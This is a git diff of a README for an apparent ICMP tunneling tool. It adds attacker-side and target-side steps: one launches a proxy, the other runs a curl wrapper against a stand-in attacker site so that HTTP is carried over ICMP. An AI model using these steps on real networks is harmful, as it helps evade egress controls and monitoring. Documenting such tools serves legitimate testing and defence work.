@@ -33,7 +33,6 @@ On both machines you need to have `qssender`and `qsreceiver`
 
 ## HTTP over ICMP tunneling
 
-🚧🚧🚧🚧**WIP**🚧🚧🚧🚧
 
 <h5 align="center">In <code>QueenSono/hack/tunneling</code></h5>
 
@@ -54,3 +53,15 @@ need cap_net_raw cap         need internet access
         └───────────┘    4    └───────────────┘     3     │            │
                                                           └────────────┘
 ```
+
+*> On the attacker machine:* Launch the proxy
+```
+./qsproxy.sh <ip_listening>
+```
+
+*> On the target machine:* Order a curl request to be performed by attacker machine
+```
+# before modify qscurl.sh with according LISTEN and REMOTE address
+./qscurl.sh http://myawesomeattacersite.com -H \"toto:titi\"
+```
+
